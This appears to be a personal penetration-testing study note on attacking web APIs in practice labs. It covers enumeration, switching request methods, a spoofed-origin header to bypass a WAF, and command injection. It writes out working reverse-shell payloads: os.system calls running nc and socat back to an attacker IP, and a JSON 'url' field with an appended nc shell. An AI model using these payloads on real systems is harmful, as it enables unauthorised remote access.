Before proceeding, enumerate APIs as you would any other web app first
	directory brute force, fuzz, etc...
#### Authenticate 
(see [[Mentor]])
	if we find auth tokens, we can potentially access pages previously denied by adding a `Authorization: <token>` header in the Burp request

If you receive Method not allowed errors, consider using different requests like POST, GET, etc...

See hetemit proving ground lab as an example

#### curl Method to POST
Send curl POSTs to see what we can do
	`curl -X POST --data "code=2*2" http://192.168.243.117:50000/verify`
		4
	looks like it executes code
	this is an example. If we tested the email field instead, we could try `--data email=test@test.com`

Test for command execution
If we know it is a python server, we can try os...
	`curl -X POST --data "code=os" http://192.168.243.117:50000/verify`
		<module 'os' from '/usr/lib64/python3.6/os.py'> 
	NOTE: other servers we can try different commands

Reverse shell
	`curl -X POST --data "code=os.system('nc <our_ip> <nc_listener> -e /bin/bash')" http://<ip>:<port>/<directory>
		we can try variants like /bin/sh, socat, etc
	another example:
	`curl -X POST --data "code=os.system('socat TCP:<our_ip>:<nc_listener> EXEC:sh')" http://<ip>:<port>/<directory>


#### Burp Method to Modify GET to POST Request

Intercept API page request

Modify GET to a POST request
	need to add these:
	`Content-Type: application/x-www-form-urlencoded
	`Content-Length = <should auto-update>`
		make sure this is updating from 0 or you may get errors
		![[Pasted image 20250512185446.png]]
		make sure this setting is enabled so Content-Length auto updates
	`<api_field>=<our_revshell_code>

Example of a json POST request:
```
POST /update HTTP/1.1
Host: 192.168.156.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 67
Content-Type: application/json

{
	"user":"admin", 
	"url":"http://192.168.45.219:22/update"
}

```

#### Bypass WAF via Spoofing Origin
Sometimes WAF will block access to API

Add this field to possibly bypass
```
X-Forwarded-For: 127.0.0.1
```

#### OS Command Injection

Assuming successful POSTs, we can attempt to append additional commands on the end of data fields we POST. This is largely dependent upon how the API behaves but is worth attempting.

Example
	**TRY MULTIPLE REVERSE SHELL ONE-LINERS** (including python)
```
POST /update HTTP/1.1
<SNIP>
Content-Length: 116
Content-Type: application/json

{
	"user":"clumsyadmin", 
	"url":"http://192.168.45.219:22/update.elf; nc 192.168.45.219 13337 -e /bin/bash"
}
```
Explanation
	Here we see "url" is used to get a file "update.elf"
	I have appended a rev shell with ;
	upon sending the POST request, both the file is got AS WELL AS A REV SHELL

#### GET vs POST

sometimes pages will reject a get request, but you can try a POST, PUT, etc

Example
	`curl -i -X POST http://192.168.199.99:33333/list-current-deployments

Length Required?
	just add it in the data field
	`curl -i -X POST  http://192.168.199.99:33333/list-current-deployments --data "Content-Length=5000"
